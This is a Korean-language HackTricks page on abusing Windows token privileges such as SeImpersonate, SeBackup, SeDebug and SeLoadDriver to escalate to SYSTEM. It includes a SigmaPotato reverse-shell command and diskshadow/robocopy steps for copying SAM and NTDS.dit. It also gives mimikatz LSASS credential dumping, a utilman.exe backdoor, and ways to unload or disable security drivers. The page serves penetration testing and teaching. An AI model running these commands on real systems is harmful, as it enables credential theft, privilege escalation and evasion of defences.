# 토큰 악용

{{#include ../../banners/hacktricks-training.md}}

## 토큰

**Windows Access Tokens가 무엇인지 모른다면** 계속하기 전에 이 페이지를 읽으세요:


{{#ref}}
access-tokens.md
{{#endref}}

**이미 보유한 토큰을 악용하여 권한을 상승시킬 수 있습니다.**

### SeImpersonatePrivilege

이 권한을 사용하면 프로세스가 토큰에 대한 핸들을 얻었을 때 해당 토큰을 impersonate할 수 있습니다(토큰을 생성할 수는 없음). 권한 있는 토큰은 Windows service(DCOM)가 exploit에 대해 NTLM authentication을 수행하도록 유도하여 획득할 수 있으며, 이후 SYSTEM 권한으로 프로세스를 실행할 수 있습니다.<sup>[[2]](#references)</sup> 이 primitive는 [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM)(WinRM이 비활성화되어 있어야 함), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)와 같은 도구를 사용하여 exploit할 수 있습니다.

Modern operator 참고 사항:

- **JuicyPotato는 legacy입니다**: Windows 10 1809+/Server 2019+에서는 어떤 RPC/COM surface에 아직 접근할 수 있는지에 따라 **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** 또는 **PrintSpoofer**를 우선 사용하세요.
- **`LOCAL SERVICE`** 또는 **`NETWORK SERVICE`**로 실행되는 service를 compromise했고 `whoami /priv`에 `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`가 없는 **filtered token**이 표시된다면, 먼저 해당 account의 **default privilege set**을 복구한 다음(예: **FullPowers** 사용) potato 계열을 다시 시도하세요.<sup>[[3]](#references)</sup>
- 일부 최신 fork는 original tool보다 operator 친화적입니다. 예를 들어 **SigmaPotato**는 reflection/in-memory execution 및 최신 Windows 호환성을 추가하며, **PrintNotifyPotato**는 PrintNotify COM service를 악용하므로 기존 Spooler 경로가 비활성화된 경우 유용한 경우가 많습니다.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**와 매우 유사하며, **동일한 방법**을 사용해 권한이 높은 token을 가져옵니다.\
그런 다음 이 privilege를 통해 새 프로세스 또는 일시 중단된 프로세스에 **primary token을 할당**할 수 있습니다. 권한이 높은 impersonation token을 사용하면 primary token을 파생할 수 있습니다(DuplicateTokenEx).\
이 token을 사용하면 'CreateProcessAsUser'로 **새 프로세스**를 생성하거나, 프로세스를 일시 중단된 상태로 생성한 후 **token을 설정**할 수 있습니다(일반적으로 실행 중인 프로세스의 primary token은 수정할 수 없습니다).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

이 token이 활성화되어 있으면 **KERB_S4U_LOGON**을 사용해 자격 증명을 알지 못해도 다른 사용자의 **impersonation token**을 가져오고, token에 **임의의 group**(admins)을 추가하고, token의 **integrity level**을 "**medium**"으로 설정한 다음 이 token을 **현재 thread**에 할당할 수 있습니다(SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

이 privilege를 통해 시스템은 모든 파일에 대한 **읽기 access** 제어 권한을 부여합니다(읽기 작업으로 제한됨). 이를 활용하면 registry에서 로컬 Administrator 계정의 **password hash**를 읽은 후, "**psexec**" 또는 "**wmiexec**"와 같은 tools를 hash와 함께 사용할 수 있습니다(Pass-the-Hash technique). 그러나 다음 두 조건에서는 이 technique이 실패합니다. Local Administrator 계정이 비활성화되어 있거나, 원격으로 연결하는 Local Administrators에서 administrative rights를 제거하는 policy가 적용되어 있는 경우입니다.<sup>[[2]](#references)</sup>\
실제로 가장 안정적인 built-in workflow는 일반적으로 **VSS + `robocopy /b`**입니다. shadow copy를 생성하고 노출한 다음, **backup mode**에서 `SAM`/`SYSTEM` 또는 `NTDS.dit`를 복사하면 file ACL을 우회할 수 있습니다.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
다음과 같이 **이 privilege를 abuse**할 수 있습니다:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)의 **IppSec** 방법 따르기
- 또는 다음의 **Backup Operators를 사용한 권한 상승** 섹션에 설명된 방법:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

이 privilege는 파일의 Access Control List (ACL)와 관계없이 모든 시스템 파일에 대한 **write access** 권한을 제공합니다. 이를 통해 **services 수정**, DLL Hijacking 수행, Image File Execution Options를 통한 **debuggers 설정** 등 권한 상승을 위한 다양한 가능성이 열립니다.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege는 특히 사용자가 tokens를 impersonate할 수 있는 경우에 유용한 강력한 permission이며, SeImpersonatePrivilege가 없는 경우에도 사용할 수 있습니다. 이 기능은 현재 process의 integrity level을 초과하지 않으면서, 동일한 user를 나타내는 token을 impersonate할 수 있는 능력에 기반합니다.<sup>[[2]](#references)</sup>

**핵심 사항:**

- **SeImpersonatePrivilege 없이 Impersonation:** 특정 조건에서 tokens를 impersonate하여 EoP에 SeCreateTokenPrivilege를 활용할 수 있습니다.
- **Token Impersonation 조건:** 성공적인 impersonation을 위해서는 대상 token이 동일한 user에 속하고, impersonation을 시도하는 process의 integrity level 이하인 integrity level을 가져야 합니다.
- **Impersonation Tokens 생성 및 수정:** 사용자는 impersonation token을 생성하고 privileged group's SID (Security Identifier)를 추가하여 권한을 높일 수 있습니다.

### SeLoadDriverPrivilege

이 privilege를 사용하면 특정 `ImagePath` 및 `Type` 값을 가진 registry entry를 생성하여 process가 **device drivers를 load 및 unload**할 수 있습니다. `HKLM` (HKEY_LOCAL_MACHINE)에 직접 write access하는 것은 제한되므로 대신 `HKCU` (HKEY_CURRENT_USER)를 사용할 수 있습니다. 그러나 `HKCU` entry가 driver configuration으로 kernel에 인식되도록 하려면 특정 path가 필요합니다.<sup>[[2]](#references)</sup>

현대적인 offensive 사용 방식은 일반적으로 **BYOVD** (bring your own vulnerable driver)입니다. 즉, **signed되었지만 vulnerable한** kernel driver를 load한 다음 해당 IOCTL을 사용하여 protections를 비활성화하거나 kernel code execution으로 이동합니다. 최근 Windows 11/Server builds에서는 **Microsoft vulnerable driver blocklist** 및/또는 **HVCI/Memory Integrity**로 인해 오래된 public chain이 중단되는 경우가 많으므로, 고전적인 `szkg64.sys` 방식의 예제가 더 이상 보편적으로 신뢰할 수 없다는 점에 유의해야 합니다.

이 path는 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`이며, 여기서 `<RID>`는 현재 user의 Relative Identifier입니다. `HKCU` 내부에 이 전체 path를 생성하고 두 개의 값을 설정해야 합니다.<sup>[[2]](#references)</sup>

- `ImagePath`: 실행할 binary의 path
- `Type`: `SERVICE_KERNEL_DRIVER` (`0x00000001`) 값

**따라야 할 단계:**

1. write access가 제한되어 있으므로 `HKLM` 대신 `HKCU`에 access합니다.
2. 현재 user의 Relative Identifier를 나타내는 `<RID>`를 사용하여 `HKCU` 내부에 `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` path를 생성합니다.
3. `ImagePath`를 binary의 execution path로 설정합니다.
4. `Type`을 `SERVICE_KERNEL_DRIVER` (`0x00000001`)로 지정합니다.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
More ways to abuse this privilege in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

이는 **SeRestorePrivilege**와 유사합니다. 주요 기능은 WRITE_OWNER access rights를 제공하여 명시적인 discretionary access 요구 사항을 우회하면서 프로세스가 **객체의 소유권을 가져올 수 있도록** 하는 것입니다. 이 과정에서는 먼저 쓰기 작업을 수행할 대상 registry key의 소유권을 확보한 다음, 쓰기 작업을 허용하도록 DACL을 변경합니다.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

이 권한을 사용하면 **다른 프로세스를 디버깅**할 수 있으며, 메모리를 읽고 쓸 수도 있습니다. 이 권한을 사용하면 대부분의 antivirus 및 host intrusion prevention 솔루션을 우회할 수 있는 다양한 메모리 injection 전략을 사용할 수 있습니다.<sup>[[2]](#references)</sup>

최신 Windows에서는 `SeDebugPrivilege`만으로도 일반적으로 **보호되지 않는 SYSTEM 프로세스**를 열고 해당 프로세스의 token을 duplicate할 수 있지만, **LSASS**에 접근할 수 있다는 보장은 없습니다. **RunAsPPL / LSA Protection**이 활성화되어 있으면 `SeDebugPrivilege`가 있어도 보호되지 않는 프로세스는 LSASS를 읽거나 injection할 수 없습니다. 이 경우 다른 non-PPL SYSTEM 프로세스에서 token을 훔치거나, `procdump`가 작동할 것이라고 가정하지 말고 PPL bypass/BYOVD와 chain해야 합니다. `SeDebugPrivilege` + `SeImpersonatePrivilege`를 사용한 전체 token-copy 예제는 [this page](sedebug-+-seimpersonate-copy-token.md)를 참조하세요.

#### Dump memory

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)를 사용하여 **프로세스의 메모리를 capture**할 수 있습니다. 특히 이는 사용자가 시스템에 성공적으로 로그인한 후 사용자 credentials를 저장하는 **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** 프로세스에 적용할 수 있습니다.

그런 다음 이 dump를 mimikatz에 load하여 passwords를 얻을 수 있습니다:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shell을 얻으려면 다음을 사용할 수 있습니다:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

이 권한(볼륨 유지 관리 작업 수행)을 사용하면 원시 볼륨 장치 핸들(예: \\.\C:)을 열어 NTFS ACL을 우회하는 직접 디스크 I/O를 수행할 수 있습니다. 이를 통해 기본 블록을 읽어 볼륨에 있는 모든 파일의 바이트를 복사할 수 있으므로, 민감한 자료(예: %ProgramData%\Microsoft\Crypto\의 머신 개인 키, registry hives, VSS를 통한 SAM/NTDS)를 임의로 읽을 수 있습니다.<sup>[[5]](#references)</sup> 특히 CA 서버에서 영향이 큰데, CA private key를 유출하면 Golden Certificate를 위조하여 모든 principal을 사칭할 수 있습니다.<sup>[[6]](#references)</sup>

자세한 기법과 완화 방법은 다음을 참조하세요.

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 권한 확인
```
whoami /priv
```
**Disabled로 표시되는 tokens**는 일반적으로 활성화할 수 있으므로, _Enabled_ 및 _Disabled_ 권한을 모두 악용할 수 있는 경우가 많습니다.

### 모든 tokens 활성화

비활성화된 권한이 있는 경우, [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) 스크립트를 사용하여 모든 tokens를 활성화할 수 있습니다:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
또는 이 [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)에 포함된 **script**입니다.

## Table

전체 token privileges cheatsheet는 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)에서 확인할 수 있으며, 아래 요약에는 해당 privilege를 악용해 admin session을 획득하거나 민감한 파일을 읽는 직접적인 방법만 나열되어 있습니다.<sup>[[1]](#references)</sup>

| Privilege                  | 영향      | Tool                    | 실행 경로                                                                                                                                                                                                                                                                                                                                     | 설명                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"potato.exe, rottenpotato.exe, juicypotato.exe와 같은 tool을 사용하여 token을 impersonate하고 nt system으로 privesc할 수 있습니다."_                                                                                                                                                                                                      | 업데이트해 주신 [Aurélien Chalot](https://twitter.com/Defte_)에게 감사드립니다. 곧 좀 더 recipe-like한 방식으로 다시 작성하겠습니다.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | `robocopy /b` 또는 전용 SeBackup-aware copy helper를 사용하여 민감한 파일을 읽습니다.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, 그리고 경우에 따라 `%WINDIR%\MEMORY.DMP`에 유용합니다.<br><br>- `robocopy`는 편리하지만, 전용 SeBackup cmdlet/API가 잠겨 있거나 열려 있는 파일에 더 유연한 경우가 많습니다.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken`을 사용하여 local admin rights를 포함한 임의의 token을 생성합니다.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** SYSTEM token을 duplicate하거나 보호되지 않은 process에서 memory를 dump합니다.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection이 활성화되어 있으면 LSASS dumping이 일반적으로 차단됩니다.</p><p>Script는 [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)에서 확인할 수 있습니다.</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | **Potato family** / named-pipe impersonation을 사용하여 SYSTEM을 spawn합니다(`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` 등).                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL, scheduled task 또는 이미 `SeImpersonatePrivilege`를 보유한 context와 같은 service account에서 가장 실용적입니다.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. signed-but-vulnerable kernel driver(BYOVD)를 load합니다.<br>2. 해당 driver의 IOCTL을 사용하여 kernel R/W를 확보하거나, security tooling을 disable하거나, SYSTEM으로 elevate합니다.<br><br>또는 이 privilege를 사용하여 <code>fltMC</code> builtin command로 security 관련 driver를 unload할 수 있습니다. 예: <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code>와 같은 오래된 public driver는 vulnerable-driver blocklist / HVCI에 의해 최신 Windows에서 점점 더 많이 차단되고 있습니다.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege가 존재하는 상태로 PowerShell/ISE를 launch합니다.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>로 privilege를 enable합니다.<br>3. utilman.exe를 utilman.old로 rename합니다.<br>4. cmd.exe를 utilman.exe로 rename합니다.<br>5. console을 lock한 후 Win+U를 누릅니다.</p> | <p>일부 AV software에서 attack이 탐지될 수 있습니다.</p><p>Alternative method는 동일한 privilege를 사용하여 "Program Files"에 저장된 service binary를 replace하는 방식입니다.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe를 utilman.exe로 rename합니다.<br>4. console을 lock한 후 Win+U를 누릅니다.</p>                                                                                                                                       | <p>일부 AV software에서 attack이 탐지될 수 있습니다.</p><p>Alternative method는 동일한 privilege를 사용하여 "Program Files"에 저장된 service binary를 replace하는 방식입니다.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>local admin rights가 포함되도록 token을 manipulate합니다. SeImpersonate가 필요할 수 있습니다.</p><p>검증 필요.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege에서 admin으로 이어지는 exploitation 경로](https://github.com/gtworek/Priv2Admin)
- [2] [Token Privileges를 악용한 LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – 내 Privileges를 돌려줘! 제발?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode는 file/folder ACL check를 우회)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – volume maintenance task 수행(SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
